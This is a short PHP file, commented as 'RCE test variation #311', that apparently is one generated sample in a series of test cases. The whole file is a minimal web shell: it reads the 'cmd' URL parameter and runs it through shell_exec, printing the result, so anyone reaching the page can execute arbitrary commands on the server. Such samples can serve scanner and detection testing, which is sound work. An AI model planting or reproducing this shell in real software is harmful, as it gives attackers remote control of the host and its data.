<?php
// RCE test variation #311
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>